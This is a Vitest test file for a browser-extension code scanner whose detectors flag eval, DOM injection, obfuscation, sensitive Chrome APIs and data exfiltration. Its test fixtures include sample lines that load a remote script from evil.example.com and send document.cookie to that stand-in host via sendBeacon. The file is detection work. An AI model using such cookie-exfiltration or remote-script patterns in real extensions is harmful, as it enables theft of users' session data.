import { describe, it, expect } from 'vitest';
import { detectEval } from '../src/code-scan/detectors/eval-detector';
import { detectDomInjection } from '../src/code-scan/detectors/dom-injection-detector';
import { detectScriptInjection } from '../src/code-scan/detectors/script-injection-detector';
import { detectDataExfiltration } from '../src/code-scan/detectors/data-exfiltration-detector';
import { detectChromeApis } from '../src/code-scan/detectors/chrome-api-detector';
import { detectObfuscation } from '../src/code-scan/detectors/obfuscation-detector';
import { detectMessagingAbuse } from '../src/code-scan/detectors/messaging-abuse-detector';
import { scanJsFile } from '../src/code-scan/scanner';
import { aggregateCodeFindings } from '../src/code-scan/signals';
import type { CodeFinding } from '../src/code-scan/types';

// ---------------------------------------------------------------------------
// eval-detector
// ---------------------------------------------------------------------------

describe('detectEval', () => {
  it('detects eval()', () => {
    const findings = detectEval('bg.js', 'eval(userCode);');
    expect(findings).toHaveLength(1);
    expect(findings[0]?.rule).toBe('eval_usage');
    expect(findings[0]?.file).toBe('bg.js');
    expect(findings[0]?.line).toBe(1);
  });

  it('detects new Function()', () => {
    const findings = detectEval('bg.js', 'var fn = new Function("return 1");');
    expect(findings.some((f) => f.rule === 'dynamic_function')).toBe(true);
  });

  it('detects setTimeout with string argument', () => {
    const findings = detectEval('bg.js', 'setTimeout("doSomething()", 500);');
    expect(findings.some((f) => f.rule === 'setTimeout_string')).toBe(true);
  });

  it('detects setInterval with string argument', () => {
    const findings = detectEval('bg.js', 'setInterval("poll()", 1000);');
    expect(findings.some((f) => f.rule === 'setInterval_string')).toBe(true);
  });

  it('does NOT flag setTimeout with a function argument', () => {
    const findings = detectEval('bg.js', 'setTimeout(() => doSomething(), 500);');
    expect(findings.some((f) => f.rule === 'setTimeout_string')).toBe(false);
  });

  it('reports correct line number for multiline content', () => {
    const content = 'var x = 1;\nvar y = 2;\neval(code);';
    const findings = detectEval('bg.js', content);
    expect(findings[0]?.line).toBe(3);
  });

  it('returns empty array for clean code', () => {
    const findings = detectEval('bg.js', 'function hello() { return 42; }');
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// dom-injection-detector
// ---------------------------------------------------------------------------

describe('detectDomInjection', () => {
  it('detects innerHTML assignment', () => {
    const findings = detectDomInjection('cs.js', 'element.innerHTML = response.data;');
    expect(findings.some((f) => f.rule === 'innerHTML_assignment')).toBe(true);
  });

  it('detects outerHTML assignment', () => {
    const findings = detectDomInjection('cs.js', 'div.outerHTML = markup;');
    expect(findings.some((f) => f.rule === 'outerHTML_assignment')).toBe(true);
  });

  it('detects insertAdjacentHTML', () => {
    const findings = detectDomInjection('cs.js', 'el.insertAdjacentHTML("beforeend", html);');
    expect(findings.some((f) => f.rule === 'insertAdjacentHTML')).toBe(true);
  });

  it('detects document.write', () => {
    const findings = detectDomInjection('cs.js', 'document.write("<script src=x>");');
    expect(findings.some((f) => f.rule === 'document_write')).toBe(true);
  });

  it('returns empty for clean DOM manipulation (textContent)', () => {
    const findings = detectDomInjection('cs.js', 'element.textContent = "safe text";');
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// script-injection-detector
// ---------------------------------------------------------------------------

describe('detectScriptInjection', () => {
  it('detects createElement("script") with src assignment', () => {
    const malicious = `
      var s = document.createElement("script");
      s.src = "https://evil.example.com/payload.js";
      document.head.appendChild(s);
    `;
    const findings = detectScriptInjection('bg.js', malicious);
    expect(findings.some((f) => f.rule === 'remote_script_injection')).toBe(true);
  });

  it('does NOT flag createElement("script") without src assignment', () => {
    const safe = `
      var s = document.createElement("script");
      s.textContent = "inline code";
      document.head.appendChild(s);
    `;
    const findings = detectScriptInjection('bg.js', safe);
    expect(findings).toHaveLength(0);
  });

  it('does NOT flag images or divs', () => {
    const safe = 'var img = document.createElement("img"); img.src = "cat.png";';
    const findings = detectScriptInjection('bg.js', safe);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// data-exfiltration-detector
// ---------------------------------------------------------------------------

describe('detectDataExfiltration', () => {
  it('detects document.cookie access', () => {
    const findings = detectDataExfiltration('cs.js', 'var c = document.cookie;');
    expect(findings.some((f) => f.rule === 'cookie_read')).toBe(true);
  });

  it('detects navigator.clipboard access', () => {
    const findings = detectDataExfiltration('cs.js', 'navigator.clipboard.readText().then(send);');
    expect(findings.some((f) => f.rule === 'clipboard_access')).toBe(true);
  });

  it('detects password field selector (quoted attribute)', () => {
    const findings = detectDataExfiltration('cs.js', 'document.querySelector("input[type=\'password\']").value');
    expect(findings.some((f) => f.rule === 'password_field_access')).toBe(true);
  });

  it('detects navigator.sendBeacon', () => {
    const findings = detectDataExfiltration('cs.js', 'navigator.sendBeacon("https://evil.example.com/", data);');
    expect(findings.some((f) => f.rule === 'sendBeacon_exfiltration')).toBe(true);
  });

  it('detects new WebSocket', () => {
    const findings = detectDataExfiltration('cs.js', 'var ws = new WebSocket("wss://evil.example.com/");');
    expect(findings.some((f) => f.rule === 'websocket_exfiltration')).toBe(true);
  });

  it('returns empty for clean network code', () => {
    const findings = detectDataExfiltration('cs.js', 'fetch("https://api.example.com/data").then(r => r.json())');
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// chrome-api-detector
// ---------------------------------------------------------------------------

describe('detectChromeApis', () => {
  it('detects chrome.debugger', () => {
    const findings = detectChromeApis('bg.js', 'chrome.debugger.attach({tabId}, "1.3");');
    expect(findings.some((f) => f.rule === 'chrome_debugger_api')).toBe(true);
  });

  it('detects chrome.proxy', () => {
    const findings = detectChromeApis('bg.js', 'chrome.proxy.settings.set({value: config});');
    expect(findings.some((f) => f.rule === 'chrome_proxy_api')).toBe(true);
  });

  it('detects chrome.cookies', () => {
    const findings = detectChromeApis('bg.js', 'chrome.cookies.getAll({domain: "example.com"}, cb);');
    expect(findings.some((f) => f.rule === 'chrome_cookies_api')).toBe(true);
  });

  it('detects chrome.management', () => {
    const findings = detectChromeApis('bg.js', 'chrome.management.getAll(callback);');
    expect(findings.some((f) => f.rule === 'chrome_management_api')).toBe(true);
  });

  it('detects chrome.webRequest', () => {
    const findings = detectChromeApis('bg.js', 'chrome.webRequest.onBeforeRequest.addListener(handler);');
    expect(findings.some((f) => f.rule === 'chrome_webrequest_api')).toBe(true);
  });

  it('returns empty for safe chrome.runtime usage', () => {
    const findings = detectChromeApis('bg.js', 'chrome.runtime.sendMessage({type: "ping"});');
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// obfuscation-detector
// ---------------------------------------------------------------------------

describe('detectObfuscation', () => {
  it('detects atob() calls', () => {
    const findings = detectObfuscation('bg.js', 'var code = atob("base64string");');
    expect(findings.some((f) => f.rule === 'obfuscation_atob')).toBe(true);
  });

  it('detects Dean Edwards packer pattern', () => {
    const findings = detectObfuscation('bg.js', 'eval(function(p,a,c,k,e,d){/* ... */}(...))');
    expect(findings.some((f) => f.rule === 'obfuscation_eval_pack')).toBe(true);
  });

  it('detects hex string arrays', () => {
    const findings = detectObfuscation('bg.js', 'var _0x = ["0x1a","0x2b","0x3c","0x4d","0x5e"];');
    expect(findings.some((f) => f.rule === 'obfuscation_hex_array')).toBe(true);
  });

  it('does NOT flag a regular string array with no hex values', () => {
    const findings = detectObfuscation('bg.js', 'var arr = ["hello","world","foo","bar","baz"];');
    expect(findings.some((f) => f.rule === 'obfuscation_hex_array')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// messaging-abuse-detector
// ---------------------------------------------------------------------------

describe('detectMessagingAbuse', () => {
  it('detects onMessage + eval in the same file', () => {
    const malicious = `
      chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
        eval(request.code);
      });
    `;
    const findings = detectMessagingAbuse('bg.js', malicious);
    expect(findings.some((f) => f.rule === 'message_eval_chain')).toBe(true);
  });

  it('does NOT flag onMessage without eval', () => {
    const safe = `
      chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
        sendResponse({ result: process(request.data) });
      });
    `;
    const findings = detectMessagingAbuse('bg.js', safe);
    expect(findings).toHaveLength(0);
  });

  it('does NOT flag eval without onMessage', () => {
    const noMessage = 'eval(code);';
    const findings = detectMessagingAbuse('bg.js', noMessage);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// scanJsFile - integration across all detectors
// ---------------------------------------------------------------------------

describe('scanJsFile', () => {
  it('returns empty findings for a benign extension popup', () => {
    const content = `
      document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('submit').addEventListener('click', function() {
          chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            chrome.tabs.sendMessage(tabs[0].id, { action: 'ping' });
          });
        });
      });
    `;
    const findings = scanJsFile({ path: 'popup.js', content });
    expect(findings).toHaveLength(0);
  });

  it('detects multiple signals in a malicious background script', () => {
    const content = `
      var data = document.cookie;
      eval(atob("cGF5bG9hZA=="));
      navigator.sendBeacon("https://evil.example.com/", data);
    `;
    const findings = scanJsFile({ path: 'background.js', content });
    const rules = findings.map((f) => f.rule);
    expect(rules).toContain('eval_usage');
    expect(rules).toContain('cookie_read');
    expect(rules).toContain('obfuscation_atob');
    expect(rules).toContain('sendBeacon_exfiltration');
  });

  it('truncates snippet to 120 characters', () => {
    const longLine = 'eval(' + 'x'.repeat(200) + ');';
    const findings = scanJsFile({ path: 'bg.js', content: longLine });
    for (const f of findings) {
      expect(f.snippet.length).toBeLessThanOrEqual(120);
    }
  });
});

// ---------------------------------------------------------------------------
// aggregateCodeFindings - deduplication and signal generation
// ---------------------------------------------------------------------------

describe('aggregateCodeFindings', () => {
  it('returns empty signals and zero score for no findings', () => {
    const { signals, score } = aggregateCodeFindings([]);
    expect(signals).toHaveLength(0);
    expect(score).toBe(0);
  });

  it('produces one signal per distinct rule', () => {
    const findings: CodeFinding[] = [
      { rule: 'eval_usage', file: 'a.js', line: 1, snippet: 'eval(x)' },
      { rule: 'eval_usage', file: 'b.js', line: 5, snippet: 'eval(y)' },
      { rule: 'cookie_read', file: 'a.js', line: 2, snippet: 'document.cookie' }
    ];
    const { signals } = aggregateCodeFindings(findings);
    expect(signals).toHaveLength(2);
    const evalSignal = signals.find((s) => s.id === 'code-scan-eval_usage');
    expect(evalSignal).toBeDefined();
    // Both files should appear as evidence
    const evidenceFiles = evalSignal?.evidence.filter((e) => e.key === 'file').map((e) => e.value) ?? [];
    expect(evidenceFiles).toContain('a.js');
    expect(evidenceFiles).toContain('b.js');
  });

  it('deduplicates evidence entries for the same file triggering the same rule twice', () => {
    const findings: CodeFinding[] = [
      { rule: 'eval_usage', file: 'bg.js', line: 1, snippet: 'eval(a)' },
      { rule: 'eval_usage', file: 'bg.js', line: 10, snippet: 'eval(b)' }
    ];
    const { signals } = aggregateCodeFindings(findings);
    const evalSignal = signals.find((s) => s.id === 'code-scan-eval_usage');
    const fileEvidence = evalSignal?.evidence.filter((e) => e.key === 'file') ?? [];
    // bg.js should only appear once
    expect(fileEvidence.filter((e) => e.value === 'bg.js')).toHaveLength(1);
  });

  it('accumulates score impact from all distinct rules', () => {
    const findings: CodeFinding[] = [
      { rule: 'chrome_debugger_api', file: 'bg.js', line: 1, snippet: 'chrome.debugger' },
      { rule: 'message_eval_chain', file: 'bg.js', line: 2, snippet: 'onMessage' }
    ];
    const { score } = aggregateCodeFindings(findings);
    // chrome_debugger_api=18, message_eval_chain=18 → 36
    expect(score).toBe(36);
  });

  it('includes a snippet evidence entry from the first finding', () => {
    const findings: CodeFinding[] = [
      { rule: 'eval_usage', file: 'bg.js', line: 1, snippet: 'eval(code)' }
    ];
    const { signals } = aggregateCodeFindings(findings);
    const hasSnippet = signals[0]?.evidence.some((e) => e.key === 'snippet' && e.value === 'eval(code)');
    expect(hasSnippet).toBe(true);
  });
});
